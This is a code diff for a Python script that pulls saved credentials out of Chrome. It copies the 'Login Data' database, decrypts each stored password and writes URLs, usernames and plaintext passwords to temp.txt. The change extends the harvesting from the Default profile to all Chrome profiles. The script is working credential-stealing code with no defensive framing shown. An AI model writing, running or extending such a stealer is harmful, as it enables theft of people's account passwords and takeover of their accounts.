@@ -28,43 +28,59 @@ def decrypt_password(encrypted_password, key):
     except Exception as e:
         return f"Unable to decrypt: {str(e)}"
 
-# Main function to extract and save passwords
-def save_chrome_passwords():
-    # Path to Chrome's Login Data database
-    db_path = os.path.join(
-        os.getenv('LOCALAPPDATA'),
-        r'Google\Chrome\User Data\Default\Login Data'
-    )
+# Function to extract passwords from a specific profile
+def extract_passwords_from_profile(profile_path, encryption_key):
+    passwords = []
+    db_path = os.path.join(profile_path, "Login Data")
+    if not os.path.exists(db_path):
+        return passwords
+
     temp_db = "temp_LoginData.db"
-    
-    # Copy database to a temp location to avoid lock issues
     shutil.copyfile(db_path, temp_db)
 
-    # Connect to the database
     conn = sqlite3.connect(temp_db)
     cursor = conn.cursor()
 
-    # Query to fetch login information
-    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-
-    # Get encryption key
-    encryption_key = get_encryption_key()
-
-    # Save passwords to temp.txt
-    with open("temp.txt", "w", encoding="utf-8") as file:
-        file.write("URL, Username, Password\n")
+    try:
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
         for row in cursor.fetchall():
             origin_url = row[0]
             username = row[1]
             encrypted_password = row[2]
             password = decrypt_password(encrypted_password, encryption_key)
-            file.write(f"{origin_url}, {username}, {password}\n")
+            passwords.append((origin_url, username, password))
+    except Exception as e:
+        print(f"Error reading database for {profile_path}: {str(e)}")
+    finally:
+        conn.close()
+        os.remove(temp_db)
+    return passwords
 
-    # Close database connection and cleanup
-    conn.close()
-    os.remove(temp_db)
+# Main function to extract and save passwords from all profiles
+def save_all_chrome_passwords():
+    base_path = os.path.join(
+        os.getenv('LOCALAPPDATA'),
+        r'Google\Chrome\User Data'
+    )
+    encryption_key = get_encryption_key()
+    all_passwords = []
+
+    # Iterate through all profiles
+    for profile in os.listdir(base_path):
+        profile_path = os.path.join(base_path, profile)
+        if os.path.isdir(profile_path) and ("Profile" in profile or profile == "Default"):
+            print(f"Extracting passwords from profile: {profile}")
+            passwords = extract_passwords_from_profile(profile_path, encryption_key)
+            all_passwords.extend([(profile, *entry) for entry in passwords])
+
+    # Save passwords to temp.txt
+    with open("temp.txt", "w", encoding="utf-8") as file:
+        file.write("Profile, URL, Username, Password\n")
+        for entry in all_passwords:
+            file.write(f"{entry[0]}, {entry[1]}, {entry[2]}, {entry[3]}\n")
+
     print("Passwords saved to temp.txt")
 
 # Run the function
 if __name__ == "__main__":
-    save_chrome_passwords()
+    save_all_chrome_passwords()
